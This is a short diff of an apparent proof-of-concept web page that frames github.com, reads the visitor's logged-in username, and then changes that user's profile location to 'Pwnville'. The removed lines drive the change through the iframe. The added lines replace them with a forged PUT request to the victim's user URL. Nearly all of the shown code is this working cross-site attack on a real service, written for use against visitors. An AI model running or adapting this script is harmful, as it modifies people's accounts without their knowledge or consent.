@@ -8,7 +8,7 @@ Your logged-in username is
 
 <hr/>
 
-<iframe width=100% height=300 id="inner" src="http://github.com/site/privacy"></iframe>
+<iframe width=100% height=80% id="inner" src="http://github.com/site/privacy"></iframe>
 
 <script>
 
@@ -22,13 +22,12 @@ function frameLoaded() {
    $('#scrapedname').text(currName.length>0?currName:"n/a");
    if (!currName) return;
 
-   var frame = document.getElementById('inner');
-   var userProfilePage = "http://github.com/"+currName;
-   if(frame.src != userProfilePage) {
-     frame.src = userProfilePage;
-   } else {
-     $(frame.contentWindow.document).find('#profile_location').click().find('input').val('Pwnville').blur();
-   }
+   var userUrl = "http://github.com/users/"+currName;
+   $.ajax({
+     type:"PUT",
+     data:"profile_location=Pwnville",
+     url:userUrl
+   });
 }
 
 $(function() {
